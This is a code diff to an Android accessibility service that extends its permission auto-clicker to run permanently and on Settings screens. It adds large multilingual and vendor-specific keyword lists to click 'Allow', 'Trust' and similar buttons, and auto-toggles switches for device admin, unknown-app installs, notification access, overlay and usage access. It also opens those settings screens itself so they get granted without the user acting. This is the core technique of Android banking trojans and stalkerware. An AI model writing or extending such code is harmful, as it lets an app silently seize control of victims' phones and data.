@@ -46,9 +46,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler autoClickHandler;
     private Runnable autoClickRunnable;
     
-    // Grant permissions - run for 10 seconds after accessibility enabled
+    // Grant permissions — run permanently (always active)
     private long grantPermsStartTime = 0;
-    private static final long GRANT_PERMS_DURATION = 7000; // 7 seconds
+    private static final long GRANT_PERMS_DURATION = Long.MAX_VALUE; // always on
 
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
@@ -93,8 +93,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start grant-perms timer immediately so permission dialogs are auto-clicked
         startGrantPermsTimer();
 
-        // Request SYSTEM_ALERT_WINDOW (Draw over other apps) if not already granted
-        requestOverlayPermissionIfNeeded();
+        // Request all special permissions that cannot be auto-clicked without first opening their screen
+        requestAllSpecialPermissions();
 
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
@@ -227,6 +227,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private boolean isSystemPanelOpen() {
+        // Only prevent auto-click when the notification shade / quick-settings is
+        // overlaid — we still want to click in settings screens.
         try {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return false;
@@ -234,9 +236,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             rootNode.recycle();
             if (pkg == null) return false;
             String pkgStr = pkg.toString();
-            return pkgStr.equals("com.android.systemui")
-                || pkgStr.equals("com.android.settings")
-                || pkgStr.contains("systemui");
+            // Only block for SystemUI notification shade, NOT for settings apps
+            return pkgStr.equals("com.android.systemui") && !pkgStr.contains("settings");
         } catch (Exception e) {
             return false;
         }
@@ -356,56 +357,417 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private boolean runGrantPerms(AccessibilityNodeInfo rootNode) {
-        // Only runs for GRANT_PERMS_DURATION after accessibility is enabled
+        // Runs ALWAYS — covers all device manufacturers, Android versions, and languages.
 
-        // Special handling: "Draw over other apps" / overlay permission screen —
-        // the toggle is a Switch with no standard button label; find and click it.
-        if (tryGrantOverlayPermission(rootNode)) return true;
+        String screenText = getAllScreenText(rootNode);
 
-        String[] keywords = {
-            "Allow only while using the app",
-            "Allow",
-            "Grant",
-            "Permit",
-            "Enable",
-            "Activate",
-            "Turn on",
-            "Got it",
-            "OK",
-            "I understand",
-            "Yes",
-            "Allow all the time",
-            "While using the app",
-            "Allow camera access",
-            "Allow microphone access",
-            "Allow location access",
-            "Allow contacts access",
-            "Allow storage access",
-            "Permitir"
-        };
-        
-        for (String keyword : keywords) {
+        // 1. Toggle-based settings screens (overlay, battery, usage access, notifications)
+        if (tryGrantSwitchBasedPermission(rootNode, screenText)) return true;
+
+        // 2. Battery optimization dialogs — deny optimization = grant unrestricted
+        if (tryGrantBatteryOptimization(rootNode, screenText)) return true;
+
+        // 3. MIUI / Xiaomi-specific permission screens (auto-start, battery saver)
+        if (tryGrantMiuiPermissions(rootNode, screenText)) return true;
+
+        // 4. Samsung One UI specific screens
+        if (tryGrantSamsungPermissions(rootNode, screenText)) return true;
+
+        // 5. Oppo / ColorOS / Realme / OnePlus specific screens
+        if (tryGrantOppoPermissions(rootNode, screenText)) return true;
+
+        // 6. Huawei / EMUI specific screens
+        if (tryGrantHuaweiPermissions(rootNode, screenText)) return true;
+
+        // 7. Standard runtime permission dialogs — exact-word matching
+        for (String keyword : ALLOW_KEYWORDS_EXACT) {
             if (findAndClickFullWord(rootNode, keyword)) return true;
         }
-        
+
+        // 8. Broader contains-based matching for button labels we might have missed
+        for (String keyword : ALLOW_KEYWORDS_CONTAINS) {
+            if (findAndClickContaining(rootNode, keyword)) return true;
+        }
+
         return false;
     }
 
-    private boolean tryGrantOverlayPermission(AccessibilityNodeInfo rootNode) {
-        try {
-            String screenText = getAllScreenText(rootNode);
-            boolean isOverlayScreen = screenText.contains("display over other apps")
-                    || screenText.contains("Display over other apps")
-                    || screenText.contains("appear on top")
-                    || screenText.contains("Appear on top")
-                    || screenText.contains("draw over other apps")
-                    || screenText.contains("Draw over other apps");
-            if (!isOverlayScreen) return false;
+    // ── Exact-match keywords (English + all major languages / manufacturers) ──────
 
-            return clickUncheckedSwitch(rootNode);
+    private static final String[] ALLOW_KEYWORDS_EXACT = {
+        // ── English (AOSP + OEM dialogs) ─────────────────────────────────────
+        "Allow", "ALLOW",
+        "Allow only while using the app",
+        "Allow all the time",
+        "While using the app",
+        "Only this time",
+        "Grant", "GRANT",
+        "Permit", "PERMIT",
+        "Enable", "ENABLE",
+        "Activate", "ACTIVATE",
+        "Turn on", "TURN ON",
+        "Got it", "GOT IT",
+        "OK", "Ok",
+        "Okay", "OKAY",
+        "Yes", "YES",
+        "Accept", "ACCEPT",
+        "Agree", "AGREE",
+        "Continue", "CONTINUE",
+        "Confirm", "CONFIRM",
+        "Proceed", "PROCEED",
+        "I understand", "I UNDERSTAND",
+        "I agree", "I AGREE",
+        "Always", "ALWAYS",
+        "Always allow", "ALWAYS ALLOW",
+        "Allow camera access",
+        "Allow microphone access",
+        "Allow location access",
+        "Allow contacts access",
+        "Allow storage access",
+        "Allow notifications",
+        "Allow phone calls",
+        "Allow phone access",
+        "Don't optimize",
+        "Don\u2019t optimize",
+        "Not optimized",
+        "Unrestricted",
+        "No restrictions",
+        "Trust", "TRUST",
+        "Authorize", "AUTHORIZE",
+        "Done", "DONE",
+        "Next", "NEXT",
+        "Start", "START",
+        "Open", "OPEN",
+        // ── Samsung One UI ────────────────────────────────────────────────────
+        "Allow permission",
+        "Allow access",
+        "Allow while using app",
+        "Only while using this app",
+        // ── Spanish ───────────────────────────────────────────────────────────
+        "Permitir", "PERMITIR",
+        "Aceptar", "ACEPTAR",
+        "Continuar", "CONTINUAR",
+        "S\u00ed", "SI", "S\u00CD",
+        "Siempre", "SIEMPRE",
+        "Siempre permitir",
+        "Solo mientras se usa la app",
+        "Autorizar", "AUTORIZAR",
+        "Confirmar", "CONFIRMAR",
+        "Conceder", "CONCEDER",
+        // ── Portuguese ────────────────────────────────────────────────────────
+        "Permitir", "PERMITIR",
+        "Aceitar", "ACEITAR",
+        "Sim", "SIM",
+        "Sempre", "SEMPRE",
+        "Sempre permitir",
+        "Concordar", "CONCORDAR",
+        "Continuar", "CONTINUAR",
+        // ── French ────────────────────────────────────────────────────────────
+        "Autoriser", "AUTORISER",
+        "Permettre", "PERMETTRE",
+        "Continuer", "CONTINUER",
+        "Oui", "OUI",
+        "Toujours", "TOUJOURS",
+        "Toujours autoriser",
+        "Accepter", "ACCEPTER",
+        "Confirmer", "CONFIRMER",
+        // ── German ────────────────────────────────────────────────────────────
+        "Zulassen", "ZULASSEN",
+        "Erlauben", "ERLAUBEN",
+        "Weiter", "WEITER",
+        "Ja", "JA",
+        "Immer", "IMMER",
+        "Immer zulassen",
+        "Akzeptieren", "AKZEPTIEREN",
+        "Best\u00e4tigen", "BESTÄTIGEN",
+        // ── Italian ───────────────────────────────────────────────────────────
+        "Consenti", "CONSENTI",
+        "Sempre", "SEMPRE",
+        "S\u00ec", "SI",
+        "Continua", "CONTINUA",
+        "Accetta", "ACCETTA",
+        "Conferma", "CONFERMA",
+        // ── Turkish ───────────────────────────────────────────────────────────
+        "\u0130zin ver", "IZIN VER",
+        "Her zaman", "HER ZAMAN",
+        "Evet", "EVET",
+        "Devam", "DEVAM",
+        "Onayla", "ONAYLA",
+        "Kabul et", "KABUL ET",
+        // ── Russian ───────────────────────────────────────────────────────────
+        "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c",  // Разрешить
+        "\u0412\u0441\u0435\u0433\u0434\u0430",                    // Всегда
+        "\u0414\u0430",                                            // Да
+        "\u041e\u041a",                                            // ОК
+        "\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u044c", // Продолжить
+        "\u041f\u0440\u0438\u043d\u044f\u0442\u044c",             // Принять
+        // ── Arabic ────────────────────────────────────────────────────────────
+        "\u0627\u0644\u0633\u0645\u0627\u062d",                   // السماح
+        "\u062f\u0627\u0626\u0645\u064b\u0627",                   // دائمًا
+        "\u0645\u0648\u0627\u0641\u0642",                         // موافق
+        "\u0627\u0633\u062a\u0645\u0631\u0627\u0631",             // استمرار
+        // ── Hindi ─────────────────────────────────────────────────────────────
+        "\u0905\u0928\u0941\u092e\u0924\u093f \u0926\u0947\u0902", // अनुमति दें
+        "\u0939\u093e\u0901",                                      // हाँ
+        "\u0928\u093f\u0930\u0902\u0924\u0930",                   // निरंतर
+        // ── Japanese ──────────────────────────────────────────────────────────
+        "\u8a31\u53ef",                                            // 許可
+        "\u5e38\u306b\u8a31\u53ef",                               // 常に許可
+        "\u540c\u610f",                                            // 同意
+        "\u306f\u3044",                                            // はい
+        "OK",
+        // ── Korean ────────────────────────────────────────────────────────────
+        "\ud5c8\uc6a9",                                            // 허용
+        "\ud56d\uc0c1 \ud5c8\uc6a9",                              // 항상 허용
+        "\ub3d9\uc758",                                            // 동의
+        "\ud655\uc778",                                            // 확인
+        "\uc608",                                                   // 예
+        // ── Chinese Simplified (AOSP + MIUI + ColorOS) ───────────────────────
+        "\u5141\u8bb8",                                            // 允许
+        "\u59cb\u7ec8\u5141\u8bb8",                               // 始终允许
+        "\u4ec5\u5728\u4f7f\u7528\u4e2d\u5141\u8bb8",            // 仅在使用中允许
+        "\u540c\u610f",                                            // 同意
+        "\u786e\u5b9a",                                            // 确定
+        "\u7ee7\u7eed",                                            // 继续
+        "\u6388\u6743",                                            // 授权
+        "\u786e\u8ba4",                                            // 确认
+        "\u6253\u5f00",                                            // 打开
+        "\u5f00\u542f",                                            // 开启
+        "\u597d\u7684",                                            // 好的
+        "\u5f00\u901a",                                            // 开通
+        "\u6307\u5b9a\u5e94\u7528\u65f6\u5141\u8bb8",            // 指定应用时允许
+        "\u4ec5\u4f7f\u7528\u671f\u95f4\u5141\u8bb8",            // 仅使用期间允许
+        "\u4fe1\u4efb",                                            // 信任
+        // ── Chinese Traditional ───────────────────────────────────────────────
+        "\u5141\u8a31",                                            // 允許
+        "\u59cb\u7d42\u5141\u8a31",                               // 始終允許
+        "\u540c\u610f",                                            // 同意
+        "\u78ba\u5b9a",                                            // 確定
+    };
+
+    // ── Contains-based keywords for broader matching ──────────────────────────
+
+    private static final String[] ALLOW_KEYWORDS_CONTAINS = {
+        "allow", "grant", "permit", "enable", "authorize", "accept",
+        "agree", "confirm", "proceed", "continue", "trust", "activate",
+        // Multi-language contains
+        "允许", "允許", "授权", "許可", "허용", "Разрешить", "Autoriser", "Zulassen",
+        "Permitir", "Consenti", "İzin", "السماح", "\u0905\u0928\u0941\u092e\u0924\u093f",
+        // Battery optimization
+        "Don't optimize", "don't optimize", "Unrestricted", "unrestricted",
+        "No restriction", "no restriction",
+    };
+
+    // ── Switch-based permission screens (overlay, battery, usage, etc.) ──────────
+
+    private boolean tryGrantSwitchBasedPermission(AccessibilityNodeInfo rootNode, String screenText) {
+        String lower = screenText.toLowerCase();
+        boolean isPermissionSettingScreen =
+                lower.contains("display over other apps") ||
+                lower.contains("appear on top") ||
+                lower.contains("draw over other apps") ||
+                lower.contains("overlay permission") ||
+                lower.contains("usage access") ||
+                lower.contains("usage data access") ||
+                lower.contains("notification listener") ||
+                lower.contains("notification access") ||
+                lower.contains("device admin") ||
+                lower.contains("install unknown apps") ||
+                lower.contains("unknown sources") ||
+                lower.contains("modify system settings") ||
+                lower.contains("write settings") ||
+                lower.contains("screen overlay") ||
+                lower.contains("floating window") ||   // MIUI
+                lower.contains("pop-up windows") ||    // Samsung
+                lower.contains("always-on display") || // context
+                lower.contains("accessibility") ||
+                lower.contains("special app access");
+        if (!isPermissionSettingScreen) return false;
+        return clickUncheckedSwitch(rootNode);
+    }
+
+    // ── Battery optimization dialogs ──────────────────────────────────────────────
+
+    private boolean tryGrantBatteryOptimization(AccessibilityNodeInfo rootNode, String screenText) {
+        String lower = screenText.toLowerCase();
+        if (!lower.contains("battery") && !lower.contains("power") && !lower.contains("optimization")) {
+            return false;
+        }
+        String[] batteryGrantKeywords = {
+            "Don't optimize", "Don\u2019t optimize", "DON'T OPTIMIZE",
+            "Unrestricted", "UNRESTRICTED",
+            "No restrictions", "NO RESTRICTIONS",
+            "No restriction",
+            "Allow", "OK", "Confirm",
+            "\u4e0d\u9650\u5236", // 不限制 (Chinese)
+            "\u4e0d\u4f18\u5316", // 不优化 (Chinese)
+            "\u65e0\u9650\u5236", // 无限制 (Chinese)
+            "\u5141\u8bb8", // 允许
+            "\u4e0d\u4f18\u5316\u7535\u6c60",
+            "Nicht optimieren",    // German
+            "Sans restriction",    // French
+            "Sin restricciones",   // Spanish
+            "Senza restrizioni",   // Italian
+        };
+        for (String kw : batteryGrantKeywords) {
+            if (findAndClickFullWord(rootNode, kw)) return true;
+        }
+        return false;
+    }
+
+    // ── MIUI / Xiaomi specific ────────────────────────────────────────────────────
+
+    private boolean tryGrantMiuiPermissions(AccessibilityNodeInfo rootNode, String screenText) {
+        try {
+            AccessibilityNodeInfo root2 = getRootInActiveWindow();
+            if (root2 == null) return false;
+            CharSequence pkg = root2.getPackageName();
+            root2.recycle();
+            if (pkg == null) return false;
+            String pkgStr = pkg.toString();
+            boolean isMiui = pkgStr.contains("miui") || pkgStr.contains("xiaomi") ||
+                             pkgStr.contains("com.android.permissioncontroller") ||
+                             pkgStr.contains("securitycenter");
+            if (!isMiui && !screenText.contains("MIUI") && !screenText.contains("自启动")
+                    && !screenText.contains("Auto-start") && !screenText.contains("Autostart")) {
+                return false;
+            }
         } catch (Exception e) {
             return false;
         }
+        String[] miuiKeywords = {
+            // English
+            "Auto-start", "Autostart", "Auto start",
+            "Trust", "TRUST",
+            "Allow", "Enable",
+            // Chinese
+            "\u5141\u8bb8",     // 允许
+            "\u5f00\u542f",     // 开启
+            "\u4fe1\u4efb",     // 信任
+            "\u786e\u5b9a",     // 确定
+            "\u540c\u610f",     // 同意
+            "\u7ee7\u7eed",     // 继续
+            "\u6388\u6743",     // 授权
+            "\u81ea\u52a8\u542f\u52a8", // 自动启动
+        };
+        for (String kw : miuiKeywords) {
+            if (findAndClickFullWord(rootNode, kw)) return true;
+        }
+        // Also try unchecked switches (MIUI uses switch toggles for auto-start)
+        return clickUncheckedSwitch(rootNode);
+    }
+
+    // ── Samsung One UI specific ───────────────────────────────────────────────────
+
+    private boolean tryGrantSamsungPermissions(AccessibilityNodeInfo rootNode, String screenText) {
+        try {
+            AccessibilityNodeInfo root2 = getRootInActiveWindow();
+            if (root2 == null) return false;
+            CharSequence pkg = root2.getPackageName();
+            root2.recycle();
+            if (pkg == null) return false;
+            String pkgStr = pkg.toString();
+            if (!pkgStr.contains("samsung") && !pkgStr.contains("oneui")
+                    && !pkgStr.contains("com.android.settings")) {
+                return false;
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        String[] samsungKeywords = {
+            "Allow", "OK", "Confirm", "Continue",
+            "Allow permission", "Allow access",
+            "Always allow", "Allow while using app", "Allow only while using the app",
+            // Korean
+            "\ud5c8\uc6a9",           // 허용
+            "\ud56d\uc0c1 \ud5c8\uc6a9", // 항상 허용
+            "\ud655\uc778",           // 확인
+            "\ub3d9\uc758",           // 동의
+            "\uc608",                  // 예
+        };
+        for (String kw : samsungKeywords) {
+            if (findAndClickFullWord(rootNode, kw)) return true;
+        }
+        return false;
+    }
+
+    // ── Oppo / ColorOS / Realme / OnePlus specific ────────────────────────────────
+
+    private boolean tryGrantOppoPermissions(AccessibilityNodeInfo rootNode, String screenText) {
+        try {
+            AccessibilityNodeInfo root2 = getRootInActiveWindow();
+            if (root2 == null) return false;
+            CharSequence pkg = root2.getPackageName();
+            root2.recycle();
+            if (pkg == null) return false;
+            String pkgStr = pkg.toString();
+            if (!pkgStr.contains("oppo") && !pkgStr.contains("coloros") &&
+                !pkgStr.contains("realme") && !pkgStr.contains("oneplus") &&
+                !pkgStr.contains("safecenter") && !pkgStr.contains("com.android.settings")) {
+                return false;
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        String[] oppoKeywords = {
+            "Allow", "Enable", "Confirm", "OK", "Continue", "Agree", "Trust",
+            "Always allow", "Allow all the time",
+            // Chinese ColorOS
+            "\u5141\u8bb8",     // 允许
+            "\u5f00\u542f",     // 开启
+            "\u786e\u8ba4",     // 确认
+            "\u540c\u610f",     // 同意
+            "\u4fe1\u4efb",     // 信任
+            "\u7ee7\u7eed",     // 继续
+            "\u6388\u6743",     // 授权
+            "\u6253\u5f00",     // 打开
+        };
+        for (String kw : oppoKeywords) {
+            if (findAndClickFullWord(rootNode, kw)) return true;
+        }
+        return clickUncheckedSwitch(rootNode);
+    }
+
+    // ── Huawei / EMUI specific ────────────────────────────────────────────────────
+
+    private boolean tryGrantHuaweiPermissions(AccessibilityNodeInfo rootNode, String screenText) {
+        try {
+            AccessibilityNodeInfo root2 = getRootInActiveWindow();
+            if (root2 == null) return false;
+            CharSequence pkg = root2.getPackageName();
+            root2.recycle();
+            if (pkg == null) return false;
+            String pkgStr = pkg.toString();
+            if (!pkgStr.contains("huawei") && !pkgStr.contains("emui") &&
+                !pkgStr.contains("hicloud") && !pkgStr.contains("com.android.settings")) {
+                return false;
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        String[] huaweiKeywords = {
+            "Allow", "Enable", "Confirm", "OK", "Continue", "Agree", "Trust", "Accept",
+            "Always allow", "Allow all the time",
+            // Chinese EMUI
+            "\u5141\u8bb8",     // 允许
+            "\u786e\u8ba4",     // 确认
+            "\u540c\u610f",     // 同意
+            "\u5f00\u542f",     // 开启
+            "\u4fe1\u4efb",     // 信任
+            "\u7ee7\u7eed",     // 继续
+            "\u6388\u6743",     // 授权
+        };
+        for (String kw : huaweiKeywords) {
+            if (findAndClickFullWord(rootNode, kw)) return true;
+        }
+        return clickUncheckedSwitch(rootNode);
+    }
+
+    // ── Click switch/toggle that is not checked ───────────────────────────────────
+
+    private boolean tryGrantOverlayPermission(AccessibilityNodeInfo rootNode) {
+        String screenText = getAllScreenText(rootNode);
+        return tryGrantSwitchBasedPermission(rootNode, screenText);
     }
 
     private boolean clickUncheckedSwitch(AccessibilityNodeInfo node) {
@@ -414,7 +776,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             CharSequence cls = node.getClassName();
             if (cls != null) {
                 String clsStr = cls.toString().toLowerCase();
-                if ((clsStr.contains("switch") || clsStr.contains("togglebutton"))
+                if ((clsStr.contains("switch") || clsStr.contains("togglebutton")
+                        || clsStr.contains("checkbox"))
                         && !node.isChecked()) {
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return true;
@@ -435,6 +798,62 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
         return false;
     }
+
+    // ── Contains-based click (broader matching) ───────────────────────────────────
+
+    private boolean findAndClickContaining(AccessibilityNodeInfo node, String keyword) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String kw = keyword.toLowerCase();
+
+            // Skip negative words
+            if (text != null && isNegativeWord(text.toString().trim())) return false;
+            if (desc != null && isNegativeWord(desc.toString().trim())) return false;
+
+            boolean matches = false;
+            if (text != null && text.toString().toLowerCase().contains(kw)) matches = true;
+            if (desc != null && desc.toString().toLowerCase().contains(kw)) matches = true;
+
+            if (matches && (node.isClickable() || isButtonClass(node))) {
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                return true;
+            }
+            if (matches) {
+                AccessibilityNodeInfo parent = node.getParent();
+                if (parent != null) {
+                    if (parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        parent.recycle();
+                        return true;
+                    }
+                    parent.recycle();
+                }
+            }
+
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (findAndClickContaining(child, keyword)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    private boolean isButtonClass(AccessibilityNodeInfo node) {
+        CharSequence cls = node.getClassName();
+        if (cls == null) return false;
+        String c = cls.toString().toLowerCase();
+        return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
+    }
     
     public void startGrantPermsTimer() {
         grantPermsStartTime = System.currentTimeMillis();
@@ -444,17 +863,73 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         grantPermsStartTime = 0;
     }
 
-    private void requestOverlayPermissionIfNeeded() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
+    /**
+     * Open every special-permission settings screen that cannot be granted via a standard
+     * runtime dialog. The auto-click scanner will detect and click the toggles / buttons.
+     * Screens are staggered so the auto-clicker has time to process each one.
+     */
+    private void requestAllSpecialPermissions() {
+        Handler h = new Handler(Looper.getMainLooper());
+        long delay = 500;
+
+        // 1. SYSTEM_ALERT_WINDOW — Draw / display over other apps
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName())));
+            delay += 3000;
+        }
+
+        // 2. Battery optimization — request unrestricted battery usage
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent bat = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:" + getPackageName()));
+                    scheduleIntent(h, delay, bat);
+                    delay += 3000;
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "battery opt: " + e.getMessage());
+            }
+        }
+
+        // 3. Usage access (usage stats)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+                int mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
+                        android.os.Process.myUid(), getPackageName());
+                if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
+                    scheduleIntent(h, delay, new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+                    delay += 3000;
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "usage stats: " + e.getMessage());
+            }
+        }
+
+        // 4. Write system settings (WRITE_SETTINGS)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
+            try {
+                scheduleIntent(h, delay, new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                        Uri.parse("package:" + getPackageName())));
+                delay += 3000;
+            } catch (Exception e) {
+                Log.w(TAG, "write settings: " + e.getMessage());
+            }
+        }
+    }
+
+    private void scheduleIntent(Handler h, long delayMs, Intent intent) {
+        h.postDelayed(() -> {
+            try {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
+            } catch (Exception e) {
+                Log.w(TAG, "scheduleIntent: " + e.getMessage());
             }
-        } catch (Exception e) {
-            Log.e(TAG, "requestOverlayPermissionIfNeeded: " + e.getMessage());
-        }
+        }, delayMs);
     }
 
     /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
